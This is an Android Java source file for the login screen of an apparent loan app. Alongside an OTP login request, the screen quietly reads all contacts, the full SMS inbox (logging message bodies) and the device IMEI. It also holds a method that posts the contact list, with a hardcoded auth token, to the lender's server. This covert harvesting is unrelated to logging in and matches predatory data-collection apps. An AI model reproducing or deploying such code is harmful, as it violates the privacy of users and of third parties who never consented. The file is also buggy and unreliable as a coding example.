package com.example.aglowmudra;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.jar.Attributes;

import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import utilites.Utils;

public class Login extends AppCompatActivity {
    public static final int REQUEST_READ_CONTACTS = 79;
    private static final String TODO = "";
    TelephonyManager telephonyManager;
    ArrayList arrayList;
    ListView list;
    Button Send_Click;
    EditText Phone_number;
    final ArrayList<String> nameList = new ArrayList<>();
    ArrayList<String> phone = new ArrayList<>();
    ArrayList<String> smses = new ArrayList<>();
    ProgressBar progressBar;


    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
            Log.d("TAG", "Value is created by system ");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                arrayList = getAllContacts();
                Log.d("TAG", "Value is creted by 1234" + arrayList);

            }
        } else {
            Log.d("TAG", "Value when is created");
            requestPermission();
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {


            }

        } catch (Exception e) {
            e.getStackTrace();

        }
        initi();
        try {
       getsms();
        }catch (Exception e){
            e.getStackTrace();
        }

        Send_Click.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                progressBar.setVisibility(View.VISIBLE);
                Toast.makeText(Login.this, "woking", Toast.LENGTH_SHORT).show();
                if (isValidate()) {
                    Thread thread = new Thread(new Runnable() {
                        @Override
                        public void run() {

                            LoginAttempt1();

                        }

                    });
                    thread.start();
                }
            }
        });
        PhoneMiMe();
      String  DeviceModel= android.os.Build.MODEL;
      Log.d("TAG","Model Name"+DeviceModel);
     String  DeviceName= android.os.Build.MANUFACTURER;
     Log.d("TAG","Device Name "+DeviceName);
    }

    private boolean isValidate() {
        if (Phone_number.getText().toString().isEmpty()) {
            Phone_number.setError("Enter Your Phone Number");
            return false;
        }
        return true;
    }


    private void requestPermission() {
        if (ActivityCompat.shouldShowRequestPermissionRationale(this, android.Manifest.permission.READ_CONTACTS) && ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_EXTERNAL_STORAGE)) {
            // show UI part if you want here to show some rationale !!!
        } else {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.READ_SMS, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.CAMERA, Manifest.permission.READ_PHONE_STATE},
                    REQUEST_READ_CONTACTS);
        }

    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        Log.d("TAG", "VAlue is created in persion not granted");
        if (requestCode == REQUEST_READ_CONTACTS) {
            Log.d("TAG", "value fisrt step");
            for (int i = 0, len = permissions.length; i < len; i++) {
                Log.d("TAG", "value" + permissions);
                String permission = permissions[i];
                if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                    boolean showRational = shouldShowRequestPermissionRationale(permission);
                    Log.d("TAG", "Value is credted" + showRational);
                    if (!showRational) {
                        if (showRational == false) {
                            Log.d("TAG", "permission is  granted");
                            requestPermission();
                            arrayList = getAllContacts();


                        }

                    } else {
                        Log.d("TAG", "permission is not granted");
                    }


                }


            }


        }


    }


    public void initi() {
        Send_Click = findViewById(R.id.Sendffff);
        Phone_number = findViewById(R.id.PhoneNumber);
         progressBar=findViewById(R.id.Prgogressbar);

    }

    private ArrayList getAllContacts() {
        Log.d("TAG", "Value is creted by system");
        String contact = "";

        Log.d("TAG", "Value is creted" + nameList);
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if ((cur != null ? cur.getCount() : 0) > 0) {
//            Log.d("TAG", "VAlue in second");
            while (cur != null && cur.moveToNext()) {
                Log.d("TAG", "Value in third");
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                //    nameList.add(name);
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Log.d("TAG", "VAlue in fouth");
                    Cursor pCur = cr.query(

                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                    while (pCur.moveToNext()) {
                        Log.d("TAG", "value in fivth");
                        String name1 = pCur.getString(pCur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        //    Log.d("TAG","Value is :"+name1 +" phone"+phoneNo);
                        // phone.add(name1);
                        // phone.add(phoneNo);
                        contact = name1 + " : " + phoneNo;
                        phone.add(contact);


                    }
                    pCur.close();
                }

            }

            Log.d("TAG", "VAlue is creted in the end" + phone);

            if (cur != null) {
                cur.close();
            }
        }
        return nameList;
    }

    public void SendContact() {
        try {
            Log.d("TAG", "VAlue is creted aftewr  send data" + phone);
            OkHttpClient client = new OkHttpClient();

            MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
            RequestBody body = RequestBody.create(mediaType, "auth_token=5e1081856674b&sms_list=%20&contact_list=" + phone);
            Request request = new Request.Builder()
                    .url("https://drfin.in/aglowcredit/api/updateCustomerDetails")
                    .post(body)
                    .addHeader("content-type", "application/x-www-form-urlencoded")
                    .addHeader("cache-control", "no-cache")
                    .addHeader("postman-token", "ce74cac2-0982-faac-cdbc-51d82c17bc87")
                    .build();

            Response response = client.newCall(request).execute();
            Log.d("TAG", "VAlue is sended" + response);


        } catch (Exception e) {
            e.getStackTrace();

        }


    }

    public void LoginAttempt1() {
        Log.d("TAG", "Value is  Login Attempt");
        String Phone_no = Phone_number.getText().toString();
        Log.d("TAG", "VAlue is creted by Login" + Phone_no);

        String url = "https://drfin.in/aglowcredit/api/sendOtp";
        RequestBody formBody = new FormBody.Builder()
                .add("mobile", Phone_no)
                .build();

        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .url(url)
                .post(formBody)
                .build();


        try {
            Response response = client.newCall(request).execute();
            Log.d("TAG", "Alue is response1V" + response);
            String responseString = response.body().string();

            Log.d("TAG", "VAlue is response22323" + responseString);
            try {
                JSONObject json = new JSONObject(responseString);


                String Active = json.getJSONObject("userdata").getString("is_active");
                Log.d("TAG", "value is frrrrrr54688" + Active);

                if (Active.equals("1")) {
                    Log.d("TAG","VAlue is in password Activity");
                    Intent intent = new Intent(Login.this, PasswordLogin.class);
                    intent.putExtra("Phone_number", Phone_no);
                    startActivity(intent);
                    progressBar.setVisibility(View.GONE);
                    finish();
                } else {
                    Log.d("TAG","VAlue is in Verfication Activity");
                    Intent intent = new Intent(Login.this, VerficationCode.class);
                    Log.d("TAG","Value is creted after Intent");
                    intent.putExtra("Phone_number", Phone_no);
                    startActivity(intent);
                    progressBar.setVisibility(View.GONE);
                }
            } catch (Exception e) {
                e.getStackTrace();

            }


        } catch (Exception e) {
            e.getStackTrace();
        }
    }

    public void PhoneMiMe() {
        Log.d("TAG", "Value is creted by");
        telephonyManager = (TelephonyManager) getSystemService(this.TELEPHONY_SERVICE);
        @SuppressLint("MissingPermission") String imeiNumber = telephonyManager.getDeviceId();
        Log.d("TAG", "Value is created in the MAin Activity Mime" + imeiNumber);


    }

    public ArrayList<String> getsms() {
        Log.d("tag", "i am at sms function ");
        Uri mysms = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(mysms, null, null, null, null);
        while (cursor.moveToNext()) {
            String number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
            String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
            String fullsms = "number" + number + ": " + msg;
            smses.add(fullsms);
            Log.d("TAG", "here is my sms " + number + "sfd " + msg);
            Log.d("TAG", "value of array for sms" + smses);
        }
        return smses;
    }


}
